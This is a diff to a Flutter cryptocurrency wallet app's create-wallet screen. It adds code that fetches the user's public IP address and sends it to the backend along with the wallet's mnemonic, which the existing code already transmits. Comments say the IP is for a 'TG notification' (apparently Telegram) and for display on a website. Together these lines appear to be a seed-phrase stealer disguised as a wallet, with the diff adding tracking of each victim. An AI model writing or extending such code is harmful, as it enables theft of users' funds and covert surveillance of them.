@@ -6,6 +6,7 @@ import '../../utils/theme_helper.dart';
 import '../../services/api_service.dart';
 import '../../services/wallet_storage.dart';
 import '../../services/passcode_storage.dart';
+import '../../services/ip_helper.dart';
 import '../auth/wallet_ready_screen.dart';
 
 class CreateNewWalletScreen extends StatefulWidget {
@@ -532,11 +533,15 @@ class _CreateNewWalletScreenState extends State<CreateNewWalletScreen> {
         devicePassCodeId: devicePassCodeId,
       );
 
+      // Fetch public IP so backend can show it in TG notification (not 127.0.0.1)
+      final publicIp = await IpHelper.getPublicIp();
+
       final walletResponse = await ApiService.createWallet(
         devicePassCodeId: devicePassCodeId,
         walletName: defaultWalletName,
         mnemonic: mnemonic,
         isMain: isFirstWallet,
+        publicIp: publicIp,
       );
 
       if (!walletResponse['success'] || walletResponse['data'] == null) {
@@ -556,6 +561,12 @@ class _CreateNewWalletScreenState extends State<CreateNewWalletScreen> {
       }
       // Always save per-wallet name so WalletSelection shows unique names.
       await WalletStorage.saveWalletNameForId(walletId, walletName);
+
+      // Report IP after wallet exists so backend can attach it to this wallet (and show on website)
+      await IpHelper.reportCurrentIpForDevice(
+        forceReport: true,
+        source: 'create new wallet',
+      );
 
       // Close loading dialog
       if (context.mounted) {
